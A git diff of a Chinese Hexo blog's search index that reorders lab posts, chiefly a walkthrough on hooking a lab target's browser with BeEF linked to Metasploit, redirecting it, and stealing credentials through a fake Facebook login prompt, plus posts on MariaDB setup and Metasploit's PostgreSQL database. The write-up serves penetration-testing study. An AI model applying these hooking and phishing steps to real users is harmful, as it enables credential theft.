+<p>单击目标ip,<code>Details</code>标签显示了客户端主机详细信息，如火狐浏览器，IE6，浏览器支持flash，支持vbscript脚本，操作系统类型</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201907661.png" alt="image-20211220201907661"></p>
+<p>单击<code>commands</code>标签，显示插件</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202003645.png" alt="image-20211220202003645"></p>
+<p>终端进入/var/www/html（apache2默认网站目录）,编辑一个<code>xss.html</code>文件，自定义xss.html网页</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202448920.png" alt="image-20211220202448920"></p>
+<p>终端修改/etc/apache2/ports.conf，修改默认端口号为8080，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202622345.png" alt="image-20211220202622345"></p>
+<p>终端启动<code>service apache2 start</code>，没有显示表示启动成功</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202805838.png" alt="image-20211220202805838"></p>
+<p>靶机输入<a href="http://192.168.1.2:8080/xss.html%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">http://192.168.1.2:8080/xss.html访问网页</a></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202925168.png" alt="image-20211220202925168"></p>
+<p>返回kali，刷新网页，单击目标ip，点击commans,依次选择<code>Browser</code>,<code>Hooked Domain</code>,<code>Redirect Browser</code>,单击最右侧的<code>RedirectURL</code>,输入<a href="http://192.168.1.2:3000/demos/butcher/index.html,%E4%BD%86%E5%8D%95%E5%87%BB%60Execute%60%EF%BC%8C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%AD%A4%E7%BD%91%E9%A1%B5">http://192.168.1.2:3000/demos/butcher/index.html,但单击`Execute`，目标主机自动访问此网页</a></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203358764.png" alt="image-20211220203358764"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203430757.png" alt="image-20211220203430757"></p>
+<p>单击commands标签，选择<code>Social Engineering</code>,<code>Pretty Theft</code>,最右侧选择框模板弹出，选择facebook模板，窃取账号密码，单击Execute，执行攻击</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203726251.png" alt="image-20211220203726251"></p>
+<p>靶机弹出facebook登录对话框，输入账号密码就会被窃取</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203846921.png" alt="image-20211220203846921"></p>
+<p>在beef的<code>Module Result History</code>标签页中，单击历史记录，发现窃取到账号密码</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203919754.png" alt="image-20211220203919754"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>beef</tag>
+        <tag>msf</tag>
+        <tag>shell</tag>
       </tags>
   </entry>
   <entry>
@@ -271,59 +324,6 @@
       </tags>
   </entry>
   <entry>
-    <title>beef+metasploit利用浏览器获取shell</title>
-    <url>/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
-    <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195046684.png" alt="image-20211220195046684"></p>
-<p>将文件中metasploit的<code>enable</code>的<code>false</code>修改为<code>true</code>,保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195427947.png" alt="image-20211220195427947"></p>
-<p>进入 /usr/share/beef-xss/extensions/metasploit/目录，编辑<code>config.yaml</code>文件，把<code>host</code>的参数跟<code>callback_host</code>参数修改成kali主机ip</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195701762.png" alt="image-20211220195701762"></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195837527.png" alt="image-20211220195837527"></p>
-<p>将<code>custom path</code>的路径修改为 <code>/usr/share/metasploit-framework/</code>，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200034953.png" alt="image-20211220200034953"></p>
-<p>输入命令<code>/etc/init.d/postgresql start</code>，启动postgresql服务，输入命令<code>msfdb init</code>，初始化数据库</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200335286.png" alt="image-20211220200335286"></p>
-<p>终端中输入msfconsole，启动metasploit，输入<code>load msgrpc ServerHost=ip Pass=abc123</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200632568.png" alt="image-20211220200632568"></p>
-<p>打开新终端，输入cd /usr/share/beef-xss/，切换到beef-xss目录下，输入<code>./beef –x</code>加载模块</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200906579.png" alt="image-20211220200906579"></p>
-<p>打开浏览器，输入<code>http://ip:3000/ui/panel</code>，访问<code>beef</code>，账号密码都是<code>beef</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201119958.png" alt="image-20211220201119958"></p>
-<p>在靶机访问<code>http://ip:3000/demos/butcher/index.html</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201335685.png" alt="image-20211220201335685"></p>
-<p>返回kali,看到beef自动连接客户端，提示目标已上线</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201458346.png" alt="image-20211220201458346"></p>
-<p>单击目标ip,<code>Details</code>标签显示了客户端主机详细信息，如火狐浏览器，IE6，浏览器支持flash，支持vbscript脚本，操作系统类型</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201907661.png" alt="image-20211220201907661"></p>
-<p>单击<code>commands</code>标签，显示插件</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202003645.png" alt="image-20211220202003645"></p>
-<p>终端进入/var/www/html（apache2默认网站目录）,编辑一个<code>xss.html</code>文件，自定义xss.html网页</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202448920.png" alt="image-20211220202448920"></p>
-<p>终端修改/etc/apache2/ports.conf，修改默认端口号为8080，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202622345.png" alt="image-20211220202622345"></p>
-<p>终端启动<code>service apache2 start</code>，没有显示表示启动成功</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202805838.png" alt="image-20211220202805838"></p>
-<p>靶机输入<a href="http://192.168.1.2:8080/xss.html%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">http://192.168.1.2:8080/xss.html访问网页</a></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202925168.png" alt="image-20211220202925168"></p>
-<p>返回kali，刷新网页，单击目标ip，点击commans,依次选择<code>Browser</code>,<code>Hooked Domain</code>,<code>Redirect Browser</code>,单击最右侧的<code>RedirectURL</code>,输入<a href="http://192.168.1.2:3000/demos/butcher/index.html,%E4%BD%86%E5%8D%95%E5%87%BB%60Execute%60%EF%BC%8C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%AD%A4%E7%BD%91%E9%A1%B5">http://192.168.1.2:3000/demos/butcher/index.html,但单击`Execute`，目标主机自动访问此网页</a></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203358764.png" alt="image-20211220203358764"></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203430757.png" alt="image-20211220203430757"></p>
-<p>单击commands标签，选择<code>Social Engineering</code>,<code>Pretty Theft</code>,最右侧选择框模板弹出，选择facebook模板，窃取账号密码，单击Execute，执行攻击</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203726251.png" alt="image-20211220203726251"></p>
-<p>靶机弹出facebook登录对话框，输入账号密码就会被窃取</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203846921.png" alt="image-20211220203846921"></p>
-<p>在beef的<code>Module Result History</code>标签页中，单击历史记录，发现窃取到账号密码</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203919754.png" alt="image-20211220203919754"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>beef</tag>
-        <tag>msf</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装apache</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
     <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
@@ -346,6 +346,79 @@
       <tags>
         <tag>apache</tag>
         <tag>centos7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装mariadb</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
+    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>mariadb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之PostgreSQL</title>
+    <url>/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
+    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
+<p><code>db_connect</code>  链接数据库</p>
+<p><code>db_disconnect</code>    断开连接</p>
+<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
+<p><code>workspace</code>   工作空间，相对于独立的</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
+<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
+<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
+<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
+<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
+<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
+<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
+<p>退出msf，执行<code>su postgres</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
+<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
+<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
+<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
+<p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
+<p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
+<p><code>service postgresql restart</code>，重启服务</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
+<p>打开msf，<code>workspace --help</code>查看用法</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
+<p><code>workspace -v</code>查看工作空间，只有默认的一个</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
+<p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
+<p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
+<p><code>workspace 2</code>切换到工作空间2</p>
+<p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>PostgreSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -372,26 +445,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装mariadb</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
-    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>centos7</tag>
-        <tag>mariadb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>first-blog</title>
     <url>/2021/11/24/first-blog/</url>
     <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
@@ -400,28 +453,6 @@
 ]]></content>
       <tags>
         <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>metasploit溢出UnrealIRCd后门漏洞</title>
